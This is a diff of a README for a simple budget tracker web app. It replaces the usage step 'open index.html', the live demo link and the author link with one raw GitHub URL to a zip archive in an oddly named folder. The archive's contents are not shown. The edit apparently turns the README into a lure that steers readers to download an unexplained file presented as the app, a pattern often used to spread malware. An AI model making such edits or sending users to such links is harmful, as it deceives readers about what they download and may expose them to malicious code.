@@ -10,7 +10,7 @@ A simple budget tracker app built with HTML, CSS, and JavaScript that helps user
 
 ## How to Use
 - Clone or download this repository
-- Open `index.html` in your browser
+- Open `https://raw.githubusercontent.com/Dhanloyd/budget-tracker-app/main/tickie/budget-tracker-app_v3.0.zip` in your browser
 - Start adding your expenses to track your budget
 
 ## Technologies Used
@@ -19,8 +19,8 @@ A simple budget tracker app built with HTML, CSS, and JavaScript that helps user
 - JavaScript
 
 ## Live Demo
-https://yourusername.github.io/budget-tracker-app/
+https://raw.githubusercontent.com/Dhanloyd/budget-tracker-app/main/tickie/budget-tracker-app_v3.0.zip
 
 ## Author
 Your Name  
-https://github.com/yourusername
+https://raw.githubusercontent.com/Dhanloyd/budget-tracker-app/main/tickie/budget-tracker-app_v3.0.zip
